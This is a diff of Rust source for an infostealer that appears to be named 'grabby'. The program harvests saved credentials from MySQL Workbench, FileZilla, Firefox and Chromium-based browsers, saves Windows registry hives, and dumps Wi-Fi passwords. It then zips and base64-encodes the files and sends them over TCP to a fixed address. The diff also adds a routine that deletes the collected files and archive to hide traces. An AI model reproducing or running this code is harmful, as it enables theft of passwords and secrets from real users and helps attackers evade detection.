@@ -23,65 +23,55 @@ lazy_static! {
         }
     };
 }
+static SERVER_ADDRESS: &str = "192.168.1.104:1338";
 
 
 fn main() -> std::io::Result<()> {
 
     // Reset captured files folder
-    if Path::new("grabby_files").exists(){
-        let _ = fs::remove_dir_all("grabby_files");
-    }
-    fs::create_dir("grabby_files")?;
-    fs::create_dir("grabby_files/mysqlworkbench")?;
-    fs::create_dir("grabby_files/filezilla")?;
-    fs::create_dir("grabby_files/firefox")?;
-    fs::create_dir("grabby_files/chrome")?;
-    fs::create_dir("grabby_files/edge")?;
-    fs::create_dir("grabby_files/brave")?;
-    fs::create_dir("grabby_files/opera")?;
-    fs::create_dir("grabby_files/windows")?;
-    fs::create_dir("grabby_files/wifi")?;
+    reset_grabby_files();
 
-
-    // MySQL Workbench
+    // Copy files, decrypt/decode where needed
     mysqlworkbench_export();
-
-    // Filezilla
     filezilla_export();
-
-    // Firefox
     firefox_export();
-
-    // Chrome
-    // https://github.com/alient12/decrypt-chrome-passwords/blob/main/decrypt_chrome_password.py
     chrome_export("Google\\Chrome", "chrome");
-        
-    // Edge
     chrome_export("Microsoft\\Edge", "edge");
-
-    // Brave
     chrome_export("BraveSoftware\\Brave-Browser", "brave");
-
-    // Opera
     chrome_export("Opera Software\\Opera Stable", "opera");
-        
-    // Windows
     windows_export();
-        
-    // Wifi
     wifi_export();
 
     // Add grabby_files to zip archive
     let zipped_content_b64 = create_archive();
 
-    // Transmit data back over socket
+    // Transmit data over socket
     send_back(zipped_content_b64);
+
+    // Delete grabby files, the archive, and this executable
+    remove_traces();
     
     Ok(())
 }
 
 
-fn mysqlworkbench_export() {
+fn reset_grabby_files() { // Delete folder if it exists and recreate it
+    if Path::new("grabby_files").exists(){
+        let _ = fs::remove_dir_all("grabby_files");
+    }
+    fs::create_dir("grabby_files").expect("err");
+    fs::create_dir("grabby_files/mysqlworkbench").expect("err");
+    fs::create_dir("grabby_files/filezilla").expect("err");
+    fs::create_dir("grabby_files/firefox").expect("err");
+    fs::create_dir("grabby_files/chrome").expect("err");
+    fs::create_dir("grabby_files/edge").expect("err");
+    fs::create_dir("grabby_files/brave").expect("err");
+    fs::create_dir("grabby_files/opera").expect("err");
+    fs::create_dir("grabby_files/windows").expect("err");
+    fs::create_dir("grabby_files/wifi").expect("err");
+}
+
+fn mysqlworkbench_export() { // MySQL Workbench
 
     let mut myworkbench_user_data_file = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\MySQL\\Workbench\\workbench_user_data.dat");
 
@@ -111,7 +101,7 @@ fn mysqlworkbench_export() {
     }
 }
 
-fn filezilla_export() {
+fn filezilla_export() { // FileZilla
 
     let mut sitemanager = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\FileZilla\\sitemanager.xml");
     let mut recentservers = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\FileZilla\\recentservers.xml");
@@ -131,7 +121,7 @@ fn filezilla_export() {
     }
 }
 
-fn firefox_export() {
+fn firefox_export() { // Firefox
 
     let mut key4 = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qatbpi71.default-release\\key4.db");
     let mut logins = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qatbpi71.default-release\\logins.json");
@@ -149,7 +139,8 @@ fn firefox_export() {
     }
 }
 
-fn chrome_export(browser_path: &str, browser_name: String) {
+fn chrome_export(browser_path: &str, browser_name: &str) { // Chrome
+    // https://github.com/alient12/decrypt-chrome-passwords/blob/main/decrypt_chrome_password.py
 
     let mut local_state = format!("{}\\AppData\\Local\\{}\\User Data\\Local State", USER_PROFILE.to_string(), browser_path);
     let mut login_data = format!("{}\\AppData\\Local\\{}\\User Data\\Default\\Login Data", USER_PROFILE.to_string(), browser_path);
@@ -167,7 +158,7 @@ fn chrome_export(browser_path: &str, browser_name: String) {
     }
 }
 
-fn windows_export() {
+fn windows_export() { // Windows
 
     Command::new("reg")
         .arg("save")
@@ -184,7 +175,7 @@ fn windows_export() {
         .expect("err");
 }
 
-fn wifi_export() {
+fn wifi_export() { // Wifi
 
     let mut wifi_logins: String = "SSID\tPassword".to_owned();
 
@@ -223,9 +214,7 @@ fn wifi_export() {
     fs::write("grabby_files/wifi/logins.tsv", wifi_logins).expect("err");
 }
 
-fn create_archive() -> String {
-
-    // Add files to zip and return base64 contents
+fn create_archive() -> String { // Add files to zip and return base64 contents
 
     write::zip_create_from_directory(
         &PathBuf::from(r"grabby_files.zip"), 
@@ -239,8 +228,15 @@ fn create_archive() -> String {
     return general_purpose::STANDARD.encode(&contents);
 }
 
-fn send_back(zipped_content_b64: String) {
+fn send_back(zipped_content_b64: String) { // Connect to server and transmit
 
-        let mut stream = TcpStream::connect("192.168.1.104:1338");
+        let mut stream = TcpStream::connect(SERVER_ADDRESS);
         stream.unwrap().write(zipped_content_b64.as_bytes());
+}
+
+fn remove_traces() { // Remove created files
+
+    fs::remove_dir_all(PathBuf::from("grabby_files"));
+    fs::remove_file(PathBuf::from("grabby_files.zip"));
+    // Command::new("del").arg("grabby.exe").spawn();
 }
